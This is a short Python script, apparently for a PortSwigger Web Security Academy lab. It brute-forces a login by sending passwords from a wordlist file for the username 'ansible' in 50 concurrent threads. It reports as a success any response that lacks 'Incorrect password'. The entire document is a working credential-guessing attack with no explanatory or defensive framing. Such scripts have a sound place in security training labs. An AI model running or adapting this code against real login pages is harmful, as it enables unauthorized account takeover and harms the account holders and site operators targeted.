from multiprocessing import Pool
from concurrent.futures import ThreadPoolExecutor
import requests

URL = "https://ac6a1ff51e18c2a1c08c4b5800f2005c.web-security-academy.net/my-account?id=wiener"

pass_file = open('pass_portswigger.txt', 'r')
pass_list = pass_file.readlines()
pass_file.close()
credentials = []

for password in pass_list:
    credentials.append({'username': 'ansible', 'password': password.strip()})

def fetch(session, url, body_req):
    with session.post(url, cookies=session.cookies, data=body_req) as req:
        if 'Incorrect password' in req.text:
            print(f"fail: {body_req}")
        else:
            print(f"success: {body_req}")

with ThreadPoolExecutor(max_workers=50) as executor:
    with requests.Session() as session:
        executor.map(fetch, [session]*len(credentials), [URL]*len(credentials), credentials)
        executor.shutdown(wait=True)